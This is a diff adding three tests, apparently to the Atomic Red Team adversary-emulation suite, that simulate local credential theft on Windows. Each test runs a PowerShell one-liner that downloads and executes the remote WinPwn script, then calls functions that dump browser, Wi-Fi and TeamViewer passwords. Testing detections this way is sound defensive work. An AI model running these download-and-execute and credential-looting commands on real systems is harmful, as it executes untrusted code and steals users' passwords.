@@ -69,3 +69,39 @@ atomic_tests:
     elevation_required: false
     command: |
       vaultcmd /listcreds:"Web Credentials" /all
+- name: WinPwn - Loot local Credentials - lazagne
+  auto_generated_guid: 079ee2e9-6f16-47ca-a635-14efcd994118
+  description: |-
+    The [LaZagne project](https://github.com/AlessandroZ/LaZagne) is an open source application used to retrieve lots of passwords stored on a local computer. 
+    Each software stores its passwords using different techniques (plaintext, APIs, custom algorithms, databases, etc.). 
+    This tool has been developed for the purpose of finding these passwords for the most commonly-used software
+  supported_platforms:
+  - windows
+  executor:
+    command: |-
+      $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
+      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+      lazagnemodule -consoleoutput -noninteractive
+    name: powershell
+- name: WinPwn - Loot local Credentials - Wifi Credentials
+  auto_generated_guid: afe369c2-b42e-447f-98a3-fb1f4e2b8552
+  description: Loot local Credentials - Wifi Credentials technique via function of WinPwn
+  supported_platforms:
+  - windows
+  executor:
+    command: |-
+      $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
+      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+      wificreds -consoleoutput -noninteractive  
+    name: powershell
+- name: WinPwn - Loot local Credentials - Decrypt Teamviewer Passwords
+  auto_generated_guid: db965264-3117-4bad-b7b7-2523b7856b92
+  description: Loot local Credentials - Decrypt Teamviewer Passwords technique via function of WinPwn
+  supported_platforms:
+  - windows
+  executor:
+    command: |-
+      $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
+      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+      decryptteamviewer -consoleoutput -noninteractive  
+    name: powershell
